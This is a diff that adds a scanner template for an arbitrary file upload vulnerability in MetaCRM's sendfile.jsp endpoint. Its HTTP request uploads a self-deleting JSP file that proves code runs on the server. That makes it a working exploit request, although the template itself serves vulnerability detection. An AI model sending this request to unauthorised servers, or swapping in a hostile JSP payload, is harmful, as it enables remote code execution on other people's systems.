@@ -1,0 +1,37 @@
+id: metacrm-sendfile-file-upload
+
+info:
+  name: MetaCRM Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects arbitrary file upload vulnerability in MetaCRM systems via the sendfile.jsp endpoint.
+    An attacker can exploit this to upload and execute malicious files on the server.
+  tags: metacrm, file-upload, rce
+
+http:
+  - raw:
+      - |
+        POST /business/common/importdata/sendfile.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary03rNBzFMIytvpW22
+
+        ------WebKitFormBoundary03rNBzFMIytvpW22
+        Content-Disposition: form-data; name="file"; filename="1.jsp"
+
+        <%out.println(new java.util.Random().nextInt(100));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+        ------WebKitFormBoundary03rNBzFMIytvpW22--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "[0-9]+"
+      - type: word
+        words:
+          - "text/html"
+        part: header
